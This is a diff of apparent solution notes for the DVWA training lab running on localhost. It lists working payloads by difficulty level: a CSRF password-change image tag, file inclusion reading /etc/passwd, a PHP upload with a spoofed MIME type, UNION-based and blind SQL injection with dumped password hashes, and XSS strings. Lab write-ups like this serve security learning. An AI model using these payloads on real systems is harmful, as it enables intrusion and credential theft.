@@ -12,7 +12,9 @@ Running burp intruder with admin as pass and default password wordlist as a payl
 
 Medium:
 
+
 High:
+Running burp intruder and grepping for csrf tokens and default password list as a payload, pitch fork for targeting
 
 #Command Injection
 
@@ -100,3 +102,145 @@ systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
 systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
 mysql:x:104:107:MySQL Server,,,:/nonexistent:/bin/false
 
+#CSRF
+
+Low: 
+
+<html><head><title></title></head><body><img src="http://127.0.0.1/vulnerabilities/csrf/?password_new=password&password_conf=password" /></body></html>
+
+Medium:
+
+High:
+
+#File Inclusion
+
+Low:
+
+http://127.0.0.1/vulnerabilities/fi/?page=/etc/passwd
+
+Medium:
+
+http://127.0.0.1/vulnerabilities/fi/?page=file:///etc/hosts
+
+High:
+
+Upload a file matching: file[0-9].php and hit it: http://127.0.0.1/vulnerabilities/fi/?page=file4.php
+
+#File Upload
+
+Low:
+
+Upload a php file
+
+Medium:
+
+Upload a php file and set its mime type to image/jpeg
+
+High:
+
+#CAPTCHA
+
+Low:
+
+Medium:
+
+High:
+
+
+#SQLi
+
+Low:
+
+1' or 1 = 1
+
+Medium:
+
+id=3 or 1 = 1&Submit=Submit intercepting with burp
+
+High:
+
+ID: 1' or 1 = 1 union select user,password from users  #
+
+ID: 1' or 1 = 1 union select user,password from users  #
+First name: admin
+Surname: admin
+
+ID: 1' or 1 = 1 union select user,password from users  #
+First name: Gordon
+Surname: Brown
+
+ID: 1' or 1 = 1 union select user,password from users  #
+First name: Hack
+Surname: Me
+
+ID: 1' or 1 = 1 union select user,password from users  #
+First name: Pablo
+Surname: Picasso
+
+ID: 1' or 1 = 1 union select user,password from users  #
+First name: Bob
+Surname: Smith
+
+ID: 1' or 1 = 1 union select user,password from users  #
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+ID: 1' or 1 = 1 union select user,password from users  #
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+
+ID: 1' or 1 = 1 union select user,password from users  #
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+
+ID: 1' or 1 = 1 union select user,password from users  #
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+ID: 1' or 1 = 1 union select user,password from users  #
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+
+#SQLi Blind
+
+Low:
+
+2' and 'a' = 'a
+
+Medium:
+
+id=1 and 1 != 2 &Submit=Submit in burp
+
+High:
+
+1' and '' = '
+
+
+#XSS Reflected
+
+Low:
+
+<script>alert(1)</script>
+
+Medium:
+
+<svg onload="alert(1)">
+
+High:
+
+<a href="#" onmouseover="alert(1)">adf</a>
+
+#XSS Stored
+
+Low:
+
+Message: <script>alert(1)</script>
+
+Medium:
+
+Message: <svg onload="alert(1)">
+
+High:
+
+Message: <a href="#" onmouseover="alert(1)">adf</a>
